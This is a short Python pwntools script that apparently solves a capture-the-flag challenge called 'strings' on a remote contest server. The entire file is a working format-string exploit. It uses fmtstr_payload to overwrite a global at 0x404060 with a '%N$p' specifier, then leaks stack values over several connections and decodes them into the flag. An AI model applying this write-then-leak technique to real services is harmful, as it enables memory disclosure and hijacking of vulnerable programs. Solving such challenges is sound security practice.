from pwn import *


context.arch = 'amd64'
# p = process('./strings')
# gdb.attach(p, gdbscript='b *main+88\nb *main2+77')

flag = ""
for i in range(8, 13):
    p = remote('challs.n00bzunit3d.xyz', 7150)

    target_addr = 0x404060 
    format_string_payload = u64(f'%{i}$p'.encode().ljust(8, b'\x00'))
    payload = fmtstr_payload(6, {target_addr: format_string_payload})

    p.recv().decode(errors='ignore')
    p.sendline(payload)
    p.recv().decode(errors='ignore')

    resp = p.recv().decode(errors='ignore')
    resp = resp[resp.find('0x'):]
    flag += p64(int(resp, 16)).decode(errors='ignore')


print(flag)
